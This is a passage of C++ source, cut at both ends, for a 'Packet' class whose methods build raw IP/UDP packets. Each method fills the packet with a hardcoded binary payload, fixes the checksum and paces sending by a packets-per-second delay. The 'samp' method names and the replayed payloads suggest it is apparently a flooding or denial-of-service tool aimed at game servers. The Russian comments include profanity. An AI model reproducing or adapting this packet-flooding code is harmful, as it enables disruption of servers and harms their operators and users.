	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x18\x00\x48\x8a\x00\x06\x30\x10\x14\x2c\xc8\x00\x25\x00\x12\x41\x60\x00\x03\x4f\xb4\x98\x89\x20\xf5\x38\x9e\xd1\x87\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x31\x00\x91\x14\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\x20\x1e\x61\x80\x00\x03\x54\xb4\x48\x94\x9f\xec\x88\x8c\xc1\x1c\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x32\x00\x91\x15\x00\x0c\x60\x20\x14\x2c\xc8\x00\x25\x40\x05\xe4\x60\x00\x05\x0f\x69\x08\x89\x1f\x3f\x58\x7d\x27\x52\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x33\x00\x91\x15\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\x60\x1c\xa6\x00\x00\x0c\x1d\x5e\x98\x63\xc0\xbd\x48\x8c\x1c\xa2\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x34\x00\x91\x16\x00\x0c\x60\x20\x14\x2c\xc8\x00\x25\x80\x04\x43\xe0\x00\x03\xbc\x40\x08\xb3\x28\x20\xf8\xa7\x2c\xf6\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x35\x00\x91\x16\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\xa0\x0c\x61\xa0\x00\x01\x7b\x5b\xf8\x98\x01\x56\x78\x41\x31\x7a\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x36\x00\x91\x17\x00\x0c\x60\x20\x14\x2c\xc8\x00\x25\xc0\x08\x48\x00\x00\x0e\x78\x95\xd8\x82\x8f\x67\x58\xa2\x2a\x82\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x37\x00\x91\x17\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\xe0\x1f\xe4\xc0\x00\x03\xa0\xc5\xc8\xb8\x12\x90\x38\x60\x10\x2c\xf8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x38\x00\x91\x18\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\x00\x16\x02\x60\x00\x12\x32\x66\xa8\xb0\xa5\xa2\xd8\xbb\x7b\xc6\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x39\x00\x91\x18\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\x20\x1e\x63\x20\x00\x10\xcd\x36\x48\x8b\x09\x4e\x78\x8d\x96\x6f\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1d\x00\x48\x8c\x80\x06\x30\x10\x14\x2c\xc8\x00\x26\x40\x15\xe8\x20\x00\x17\xe7\x7d\x18\x83\x1a\x8d\xa8\x90\xa5\x84\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3b\x00\x91\x19\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\x60\x1b\x86\x60\x00\x17\x59\xb8\xe8\x99\x8f\x60\xd8\xa8\x22\x7f\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3c\x00\x91\x1a\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\x80\x02\xc0\x40\x00\x0f\x22\x86\x18\xb8\xf2\xfe\x58\x8a\xcf\x62\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3d\x00\x91\x1a\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\xa0\x10\xa4\xa0\x00\x11\xf2\xe1\x28\xb4\xf5\xa1\x48\xbf\x1b\x60\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3e\x00\x91\x1b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\xc0\x1b\xc6\xc0\x00\x0c\x77\xe5\x48\xa9\xe4\xb1\x78\x8f\x44\x70\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3f\x00\x91\x1b\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\xe0\x13\x88\x00\x00\x05\x08\xf1\x78\x64\x48\x02\x78\xb8\x35\x3c\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x40\x00\x91\x1c\x00\x0c\x60\x20\x14\x2c\xc8\x00\x27\x00\x1b\x66\x60\x00\x00\x0f\x02\xc8\x21\x11\x86\x18\x85\xdc\x74\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x41\x00\x91\x1c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\x20\x16\xe8\x20\x00\x19\x9d\x00\x58\x9e\x20\xe3\x48\xbf\xab\xa0\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x42\x00\x91\x1d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x27\x40\x1a\x85\xe0\x00\x1b\x01\xc2\x98\xa4\xff\x01\xe8\xb6\xc5\xd4\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x43\x00\x91\x1d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\x60\x0e\x83\xc0\x00\x03\x01\xf0\xe8\x75\x52\xf4\xa8\x98\x1e\x7d\x68\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x40\x00\x48\x9e\x00\x06\x30\x10\x14\x2c\xc8\x00\x2f\x00\x1f\xc0\x80\x00\x03\x07\xfd\x68\x7f\x21\xa6\x68\xa3\xbb\x45\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x81\x00\x91\x3c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x20\x00\xa5\x00\x00\x12\x04\x4c\xb8\x8f\x4d\x85\xd8\xb6\x7d\xbc\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x82\x00\x91\x3d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x40\x06\x45\x40\x00\x12\x1a\x69\xc8\x90\x0f\x5d\xb8\x61\xe7\x9a\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x83\x00\x91\x3d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x60\x1f\xe5\xa0\x00\x1a\x0f\xde\xe8\x77\x12\xd0\x18\x7a\x0c\x2d\x88\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x84\x00\x91\x3e\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x80\x04\xa6\x80\x00\x0b\x5e\x79\x78\x9f\x70\xe6\x08\xbc\xde\x24\x78\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x85\x00\x91\x3e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2f\xa0\x0d\x25\x20\x00\x0a\x0b\x09\x68\x99\x7e\x02\xa8\xbc\x08\x4c\xa8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x86\x00\x91\x3f\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2f\xc0\x0a\xa4\x60\x00\x01\x90\x51\x58\x9c\x1b\x42\xb8\x6c\x97\xa5\x18\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x87\x00\x91\x3f\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2f\xe0\x02\x43\x00\x00\x19\x36\xe0\xd8\xb7\x0f\x82\xf8\x81\x6b\x81\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x88\x00\x91\x40\x00\x0c\x60\x20\x14\x2c\xc8\x00\x30\x00\x10\xe1\x40\x00\x06\x86\xe6\x58\x84\x15\xaa\x28\x72\x57\xb7\xa8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x89\x00\x91\x40\x80\x0c\x60\x20\x14\x2c\xc8\x00\x30\x20\x15\xa6\xe0\x00\x10\x92\x58\x58\x9d\x0c\xbb\xb8\x71\xd0\xd8\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x69\x01\xc8\xb2\x80\xc6\x30\x10\x14\x2c\xc8\x00\x39\x40\x62\xe0\xa0\x00\x0c\xd7\x55\x48\x95\x87\x81\xd8\x87\xf5\x72\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd3\x03\x91\x65\x81\x8c\x60\x20\x14\x2c\xc8\x00\x39\x60\x77\x23\x20\x00\x1e\x03\x64\x98\x7e\x9e\xca\xc8\x9c\x50\x1f\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd4\x03\x91\x66\x01\x8c\x60\x20\x14\x2c\xc8\x00\x39\x80\x7c\x08\x20\x00\x07\xc4\x18\xc8\x8b\x11\xaa\xc8\x91\x50\xf7\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd5\x03\x91\x66\x81\x8c\x60\x20\x14\x2c\xc8\x00\x39\xa0\x75\x05\xe0\x00\x1d\x90\x62\x58\xa1\x07\xc9\xc8\x97\xfc\x04\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd6\x03\x91\x67\x01\x8c\x60\x20\x14\x2c\xc8\x00\x39\xc0\x78\x43\xc0\x00\x0d\xb9\xc1\xc8\xb1\x02\x60\x78\xa1\x00\xfd\xe8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd7\x03\x91\x67\x81\x8c\x60\x20\x14\x2c\xc8\x00\x39\xe0\x70\xc4\x80\x00\x02\x12\x67\xf8\x9c\x1e\xe8\xf8\x72\x14\xac\xa8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd8\x03\x91\x68\x01\x8c\x60\x20\x14\x2c\xc8\x00\x3a\x00\x6a\x24\x00\x00\x17\x7d\x21\x68\xb4\x6f\xa4\x48\xb0\x3b\xc4\xc8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd9\x03\x91\x68\x81\x8c\x60\x20\x14\x2c\xc8\x00\x3a\x20\x68\x60\xc0\x00\x08\x53\xfd\x28\x88\x16\xe1\x08\x47\xbe\x43\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xda\x03\x91\x69\x01\x8c\x60\x20\x14\x2c\xc8\x00\x3a\x40\x79\xe2\x20\x00\x18\x02\xe1\x38\x7f\x11\x0c\x88\x88\x44\x1a\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xdb\x03\x91\x69\x81\x8c\x60\x20\x14\x2c\xc8\x00\x3a\x60\x77\xc2\x20\x00\x03\x3d\x10\x38\x80\x02\x8c\xc8\x7c\xdd\x31\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 336; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x78\x01\xc8\xba\x00\xcc\x60\x90\x14\x8b\xd4\x61\x28\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x00\x00\xc4\x9e\x27\x63\xc0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\xa9\x9d\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x98\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf1\x03\x91\x74\x81\xa3\xc0\x14\x3c\xe2\x06\x6d\x50\x10\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 358; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x00\x32\x28\x06\x34\xe3\x00\x00\x07\x00\x64\x90\x09\xd6\x08\x49\x2f\x34\xe3\x00\x00\x08\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x03\x4e\x30\x00\x00\x09\x00\x91\x00\x80\x18\xc1\x20\x14\x8b\xd4\x61\x28\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x00\xc0\x16\xf1\x20\x33\xc0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\xa9\x9d\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x98\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 180; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x0a\x00\x0a\x00\x91\x01\x00\x27\xc0\x14\x0c\xe6\x0c\xd3\xd2\x64\x5c\x39\x20\x5c\x5b\x50\xab\xc4\x10\x0b\x00\x91\x01\x80\x23\xc0\x14\x13\xe2\x02\x0a\xe2\xe4\x20\x0c\x00\x91\x02\x00\x27\xc0\x14\x9d\xe6\x01\x6e\xd2\x54\x52\xd4\x70\x5c\x5e\x63\xdb\xe4\x10\x0d\x00\x91\x02\x80\x28\x40\x14\x9e\xe6\x8c\xd3\xd2\x64\x5c\x39\x20\x5c\x5b\x50\xab\xc4\x10\x20\x0e\x00\x91\x03\x00\x2e\x00\x14\x56\xec\x40\x00\x00\x35\x04\x54\x40\x94\x94\x44\xc4\x55\xf6\x36\x86\x17\x43\x33\x38\x34\x07\x01\x00\x00\x00\x0f\x00\x82\x6c\x04\x14\x80\xcf\x00\x20\x3f\xe6\x40\x00\x00\x0d\xb7\xac\x3c\x28\x98\x9f\xbe\x18\x89\x4d\x69\xe8\x20\x00\x00\x00\x00\x00\x00\x00\x05\xc0\x00\x00\x05\x60\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe5\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 536; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x08\x80\x48\x81\xc0\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x91\x04\x00\x27\xc0\x14\x0c\xe6\x08\x3e\x7c\x5c\x49\x14\x84\xb4\x40\x04\x0d\xa4\x00\x13\x00\x91\x04\x80\x25\xc0\x14\x16\xe4\x02\xb0\x00\x00\x04\xd0\x00\x00\x00\x14\x00\x91\x05\x00\x25\xc0\x14\x16\xe4\x02\xe0\x00\x00\x06\x40\x00\x00\x00\x15\x00\x91\x05\x80\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00\x16\x00\x91\x06\x00\x22\x00\x14\x98\xf8\x19\x17\x00\x91\x06\x80\x23\xc0\x14\x92\xe2\x08\x99\x3b\x73\xd0\x18\x00\x91\x07\x00\x22\x00\x14\x5e\xf8\x11\x19\x00\x91\x07\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x1a\x00\x91\x08\x00\x22\x00\x14\x58\xf8\x10\x1b\x00\x91\x08\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x1c\x00\x91\x09\x00\x27\xc0\x14\x5a\xe6\x04\x46\x89\xbc\x1e\x14\xaa\xf4\x25\x6f\xc7\x24\x20\x1d\x00\x91\x09\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x20\x0b\x88\x00\x00\x0f\x79\x85\xf8\xbe\xd0\xfc\x48\x87\x98\x2b\xa8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1e\x00\x91\x0a\x00\x22\x00\x14\x98\xf8\x06\x1f\x00\x91\x0a\x80\x22\x00\x14\x14\xf0\xf0\x20\x00\x91\x0b\x00\x22\xc0\x14\x1d\xe1\x00\x00\x00\x21\x00\x91\x0b\x80\x22\x00\x14\x1e\xf8\x01\x22\x00\x91\x0c\x00\x25\x40\x14\x0b\xe3\x80\x00\x00\x37\x76\x46\x40\x10\x23\x00\x91\x0c\x80\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf8\x08\x0f\x00\x24\x00\x91\x0d\x00\x23\xc0\x14\x23\xe2\x05\x51\x70\x00\x00\x25\x00\x91\x0d\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x07\x50\x00\x00\x00\x26\x00\x91\x0e\x00\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x27\x00\x91\x0e\x80\x2b\xc0\x14\x2b\xea\x0e\xd0\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x28\x00\x91\x0f\x00\x27\xc0\x14\x9d\xe6\x0e\x46\xb6\x5c\x4e\x5b\x92\xc4\x52\x96\xe8\xec\x40\x29\x00\x91\x0f\x80\x28\x40\x14\x9e\xe6\x82\xdd\xb2\xc4\x51\x4a\x71\x24\x4f\x01\x78\x24\x40\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 392; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
